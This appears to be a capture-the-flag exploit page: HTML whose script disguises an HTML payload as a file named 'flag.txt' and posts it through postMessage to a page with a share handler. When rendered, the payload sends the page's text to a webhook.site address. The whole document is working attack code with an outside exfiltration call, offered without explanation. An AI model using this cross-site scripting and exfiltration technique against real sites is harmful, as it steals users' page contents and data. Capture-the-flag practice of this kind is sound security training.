<!DOCTYPE html>
<html>
<head>
  <title>Exploit</title>
</head>
<body>
  <h1>CTF Exploit</h1>
  <script>
    // Create a fake .txt file containing JS that will be executed in the sandbox iframe
    const payload = `
      <script>
        fetch('https://webhook.site/ae1bf336-67e2-4b9d-8bee-88cfcbd27f28', {
          method: 'POST',
          mode: 'no-cors',
          body: document.body.innerText
        });
      <\/script>
    `;

    const blob = new Blob([payload], { type: 'text/html' });

    const file = {
      blob: blob,
      name: 'flag.txt',
      cached: false
    };

    window.onload = () => {
      window.postMessage({ type: 'share', files: [file] }, '*');
    };
  </script>
</body>
</html>
